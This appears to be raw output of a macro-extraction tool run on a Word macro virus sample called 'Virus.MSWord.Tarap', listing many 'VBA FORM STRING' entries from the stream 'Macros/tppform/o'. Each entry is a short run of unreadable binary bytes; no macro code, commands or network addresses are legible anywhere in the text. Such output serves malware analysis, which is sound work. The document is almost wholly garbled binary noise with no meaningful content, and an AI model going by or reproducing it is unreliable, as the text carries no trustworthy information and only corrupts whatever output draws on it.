��jm&��M��Ҵ�K[$�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(
I<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(�<A��&8n�D�^^I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�Ü��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�:FmCJ����Ctbd��(@h��;
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�8R=��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
iZ���Sʴ�����F{d���B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�����G��}�{+�@���d�\
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��\n+���4�n��QLc���ʺT�|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A��I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���U��ie{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vy���֕���?�b���vex�PBȟ6�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����S��,�h.��~dwQ�	�~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'��RGp�s"Ɠ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ȡf!NC
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
����e�%�԰���M,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e9%pA*x���c�#��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jZ��w���m7��R�1Q�5\��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Wz�>a�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�n�e�4�߷jV��F�4��aV=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pܞ�郊��RZ4�M�:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}���lR�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3J�J�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}@�v�Kw�-7�zU���T��t��X���d�U,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A�Q�NFHc�x�H8��sM�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x>��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mZ�P"�n#��!u^v�

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F8����m�ſ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x/�6����2�/,�5�`p���bN�smp
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n6�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I��Zo
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^Dd��5%m��HF�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��(劐F"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hV�	�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�!�ȪU�������9l�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F����\kj�j�q�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*)a��ml��/5d�m�A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hذ!�#�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J���}FY�+,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���͐r
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'��߶*MC\�E�n.���w��{ϲ�~l�F�IET�H��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��c�GU�5�'W�Y�hn�nʹK3Fg�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C
ݎ��kD�<{ �kf�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p	�b��խ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Ŕ0\E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �s�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*{ɟH�_�r5��~Л��q�L��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v���m��K?'
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�a�VX���$�;N6
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�q�8�_N��[X�h��]D�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`B�$u-��69�*�v�Zj�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�¶�Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Y2K�'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�Y~6�a��y�Ʋϧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"刍�H��&(0��B�S�I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�/�J�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�Â�^��i�i��֓��vy
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��0La�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|P���[�WP���ӱu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����c1,����w�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�E��~
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�z���~%|A٨
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�ٵ���m�Q
J�D���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��<+|�?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?h�_
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�%�w�m���o���g�Bw
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6��<�9ȯTy��o�� �jG��>j��0q�\g���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�,�u��sa%߉�����s��to�(`
�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e|A��<o��Dx,�-b�R��[qo
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�c.dِ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*q�����\C&�/�ot#a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k_Z��,`ц�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�009
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[�{;H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�J��p1��x�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����9���<�K(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pO�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��ܤ:1�2m�H�^��g5��-:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'Y���Y�ᮄ�bp��,Y�*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$��:�Kf����A|�y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v'9�1Z�=������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�yC(F-
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ń�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yޥ�̞Z���9�0f�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h8�,���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I(�5�΍
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�:r:�&��c���O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p$�=��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ζ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YeFw���6��x�
�GU��_�&��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m����Cչ��H�(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�vH�8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�+�M��QӒ�^(��.���w3E��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~"x��M��5�.��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�2�8޸$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<�9�����c����S�E���H���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g��1�}���<5�hW��}�mWG�᷾
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ud�T3�c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#+�H�j��ˋO
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ҽ1{���j��Y�k�i���	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
),X��0H�S�g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p���e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ʃ����ѯX<�|��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"��Q�?x��p+���V���H�<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hr��.��I���B�Wc��܅
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bh0@�N6�q�>`GoZ�ggq�G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�i��'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9����m��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*=R��]<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�+�'��(
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>ˁV���	�r�(�r}�$P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#?xs�qJ��7Iդ��-��-L�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fX��칑sĘ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n=����e��U��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�asf�W�0�m&�*�f
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(��<��c<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��=̓Z�q�VI�Uɍ�e*0T��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0{��
43�o����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
՘*ȧ$ya_�
3����RG#Iwt��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�y@���We.w��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.>��TM
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z[]35���)&1	I!��o�9 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]v/"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Tarap' - OLE stream: 'Macros/tppform/o'
